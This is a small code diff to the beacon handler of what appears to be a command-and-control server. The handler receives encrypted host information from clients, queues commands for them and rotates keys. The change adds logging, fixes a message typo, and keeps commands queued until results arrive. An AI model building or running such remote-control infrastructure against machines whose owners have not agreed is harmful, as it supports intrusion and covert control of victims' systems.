@@ -27,6 +27,9 @@ class BeaconHandler(BaseHandler):
             system_info_encrypted
         )
         
+        # Log the beacon
+        self.log_message(f"Identified client {client_id} ({system_info.get('Hostname', 'Unknown')})")
+        
         # Verify client if system info is available
         needs_key_rotation = False
         if system_info:
@@ -48,16 +51,15 @@ class BeaconHandler(BaseHandler):
         for command in commands:
             cmd_type = command['command_type']
             args = command['args'] if cmd_type != 'key_rotation' else '[REDACTED KEY]'
-            self.client_manager.log_event(client_id, "Command send", f"Type: {cmd_type}, Args: {args}")
+            self.client_manager.log_event(client_id, "Command sent", f"Type: {cmd_type}, Args: {args}")
         
         # Send response to client
         self._send_beacon_response(client_id, commands, has_key_rotation)
         
-        # Clear commands after successful delivery
+        # Do NOT clear commands after delivery - they should be cleared when results are received
+        # We'll only clear key rotation commands since they're handled differently
         if has_key_rotation:
             self.client_helper.clear_commands_after_rotation(client_id)
-        else:
-            self.client_manager.clear_pending_commands(client_id)
     
     def _send_beacon_response(self, client_id, commands, has_key_rotation):
         """Send the encrypted response to the client beacon"""
